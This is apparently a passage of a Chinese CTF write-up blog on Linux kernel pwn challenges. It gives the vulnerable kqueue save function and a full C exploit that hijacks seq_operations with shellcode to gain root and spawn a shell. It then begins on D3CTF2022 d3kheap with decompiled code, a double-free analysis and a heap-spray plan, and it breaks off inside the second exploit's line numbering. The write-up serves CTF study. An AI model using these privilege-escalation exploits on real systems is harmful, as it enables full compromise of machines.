class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">save_kqueue_entries</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="type">char</span> *new_queue = validate((<span class="type">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个全局数组标识一个 queue 是否 saved 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 create_queue 中使用 <code>request.max_entries + 1</code> 来进行判定，因此我们可以传入 0xffffffff 使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 <code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p><p>前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue-&gt;queue_size，即 0x18，应当从 <code>kmalloc-32</code> 中取，那么我们来考虑在该 slab 中可用的结构体,<strong>seq_operations</strong> 这个结构体同样从 <code>kmalloc-32</code> 中分配，当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code> ）便会在内核空间中分配一个 seq_operations 结构体<br>通过这个能够劫持内核执行流</p><p>由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道 prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行 <code>commit_creds(prepare_kernel_cred(NULL))</code></p><p>ScuPax0s 师傅给出了一个美妙的解法：<strong>通过编写 shellcode 在内核栈上找恰当的数据以获得内核基址</strong>，至于怎么找就得调试了,执行<code>commit_creds(prepare_kernel_cred(NULL))</code> 并返回到用户态</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span>    max_entries;</span><br><span class="line">    <span class="type">uint16_t</span>    data_size;</span><br><span class="line">    <span class="type">uint16_t</span>    entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span>    queue_idx;</span><br><span class="line">    <span class="type">char</span>*       data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> root_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">createQueue</span><span class="params">(<span class="type">uint32_t</span> max_entries, <span class="type">uint16_t</span> data_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req = </span><br><span class="line">    &#123;</span><br><span class="line">        .max_entries    = max_entries,</span><br><span class="line">        .data_size      = data_size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADC0DE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx,<span class="type">uint16_t</span> entry_idx,<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req =</span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx  = queue_idx,</span><br><span class="line">        .entry_idx  = entry_idx,</span><br><span class="line">        .data       = data,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDAADEEEE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req = </span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx = queue_idx,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xBADDCAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveQueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx,<span class="type">uint32_t</span> max_entries,<span class="type">uint16_t</span> data_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req =</span><br><span class="line">    &#123;</span><br><span class="line">        .queue_idx      = queue_idx,</span><br><span class="line">        .max_entries    = max_entries,</span><br><span class="line">        .data_size      = data_size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xB105BABE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, [rsp + 0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, 0x8c580;&quot;</span>  <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">        <span class="string">&quot;add r13, 0x8c140;&quot;</span>  <span class="comment">// commit_creds</span></span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, root_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r14;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span>**envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span>        seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">size_t</span>      *page;</span><br><span class="line">    <span class="type">size_t</span>      data[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    root_rip = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the dev!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="type">size_t</span>) shellcode;</span><br><span class="line"></span><br><span class="line">    createQueue(<span class="number">0xffffffff</span>, <span class="number">0x20</span> * <span class="number">8</span>);</span><br><span class="line">    editQueue(<span class="number">0</span>, <span class="number">0</span>, data);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    saveQueue(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D3CTF2022-d3kheap"><a href="#D3CTF2022-d3kheap" class="headerlink" title="D3CTF2022-d3kheap"></a>D3CTF2022-d3kheap</h2><p>又是<code>arttnba3</code>大佬出的题</p><p>常规保护拉满,就不多说了</p><h3 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h3><p>模块只注册了ioctl函数,并且只实现了alloc和free两个功能</p><p>alloc会申请一个1024的obj</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">d3kheap_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0xDEAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0xDEAD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1234</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;\x011[d3kheap:] You already had a buffer!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">3264LL</span>, <span class="number">1024LL</span>);</span><br><span class="line">        ++ref_count;</span><br><span class="line">        buf = v3;</span><br><span class="line">        printk(&amp;unk_37A);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0x1233</span> &amp;&amp; ((_DWORD)a2 == <span class="number">0x4321</span> || (_DWORD)a2 == <span class="number">0xBEEF</span>) )</span><br><span class="line">      printk(&amp;unk_3F0);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">      printk(&amp;unk_4F8);</span><br><span class="line">LABEL_5:</span><br><span class="line">    pv_ops[<span class="number">79</span>](&amp;spin);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_4A8);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ref_count )</span><br><span class="line">  &#123;</span><br><span class="line">    --ref_count;</span><br><span class="line">    kfree();</span><br><span class="line">    printk(&amp;unk_394);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))d3kheap_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞就出在ref_count被初始化为1</p><p>导致存在一个double free,因为slub也有double free的检查(要释放的指针是否等于slub上的第一个指针),所以需要转化为UAF利用</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以说是一道十分经典的考察内核堆喷这一手法的题目了</p><p>将两次free得出的obj分别称作A与B,思路如下</p><ol><li>堆喷msg队列,每个消息队列上有两个消息,分别是96与1024(总大小),使一个1024的obj获得A</li><li>堆喷sk_buff,使其获得B,并修改A,使其m_ts与其他obj不同</li><li>遍历读取msg,因为前一步修改了A的size,所以读取A时会返回负数,依此判定victim</li><li>释放所有的sk_buff,重新堆喷sk_buff,使得再次读取msg时可以越界读取到下一个obj的header</li><li>释放所有的sk_buff,重新堆喷sk_buff,利用上一步中的header中的prev指针来读取victim的下一个obj的地址,并通过减去0x400,得到victim的地址</li><li>释放所有的sk_buff,重新堆喷sk_buff,恢复victim,然后将其释放</li><li>堆喷pipe_buffer,此时pipe_buffer与sk_buff重叠</li><li>释放所有的sk_buff,并在过程中判断重叠的那个obj,读取其中的数据,泄露内核代码基址</li><li>布置rop流与伪造的pipe_buffer,重新堆喷sk_buff,写入到victim中,并关闭所有的管道触发</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span 